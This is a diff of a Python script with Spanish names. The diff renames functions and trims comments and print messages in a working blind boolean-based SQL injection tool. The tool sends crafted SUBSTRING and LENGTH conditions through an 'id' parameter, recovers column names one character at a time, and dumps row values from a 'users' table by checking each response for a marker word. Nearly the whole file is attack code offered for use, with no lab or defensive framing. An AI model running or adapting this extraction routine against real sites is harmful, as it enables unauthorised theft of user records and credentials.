@@ -6,9 +6,7 @@ INYECTABLE_PARAM = "id"
 
 TRUE_TEXT = "NOTICIAS"   # texto cuando la condición es TRUE
 
-# --------------------------------------------------
-
-def is_true(condition):
+def condiccion_logica(condition):
     """
     Lanza una petición con una condición booleana
     y devuelve True / False según la respuesta
@@ -18,9 +16,7 @@ def is_true(condition):
 
     return TRUE_TEXT in r.text
 
-# --------------------------------------------------
-
-def get_column_names(max_columns=10, max_len=20):
+def extrae_nombre_columnas(max_columns=10, max_len=20):
     columns = []
 
     for col_index in range(0, max_columns):
@@ -39,7 +35,7 @@ def get_column_names(max_columns=10, max_len=20):
                 {pos},1
                 ) = '{c}'
                 """
-                if is_true(condition):
+                if condiccion_logica(condition):
                     name += c
                     break
                 else:
@@ -47,16 +43,14 @@ def get_column_names(max_columns=10, max_len=20):
 
         if name:
             columns.append(name)
-            print(f"[+] Columna encontrada: {name}")
+            print(f"Columna encontrada: {name}")
         else:
             break
 
     return columns
 
-# --------------------------------------------------
-
-def dump_column(column, max_rows=10, max_len=50):
-    print(f"\n[+] Dump de columna: {column}")
+def extrae_valor_columna(columna, max_rows=10, max_len=50):
+    print(f"\nExtrae valor de columna: {columna}")
 
     for row in range(0, max_rows):
         value = ""
@@ -64,15 +58,15 @@ def dump_column(column, max_rows=10, max_len=50):
             for c in string.printable:
                 condition = f"""
                 1 AND LENGTH(
-                    (SELECT {column} FROM users LIMIT {row},1)
+                    (SELECT {columna} FROM users LIMIT {row},1)
                 ) >= {pos}
                 AND SUBSTRING(
-                    (SELECT {column} FROM users LIMIT {row},1),
+                    (SELECT {columna} FROM users LIMIT {row},1),
                     {pos},1
                 ) = '{c}'
                 """
                 
-                if is_true(condition):
+                if condiccion_logica(condition):
                     value += c
                     break
             else:
@@ -83,11 +77,9 @@ def dump_column(column, max_rows=10, max_len=50):
         else:
             break
 
-# --------------------------------------------------
-
 if __name__ == "__main__":
-    print("[*] Enumerando columnas de users...\n")
-    cols = get_column_names()
+    print("Columnas de users: \n")
+    cols = extrae_nombre_columnas()
 
     for col in cols:
-        dump_column(col)
+        extrae_valor_columna(col)
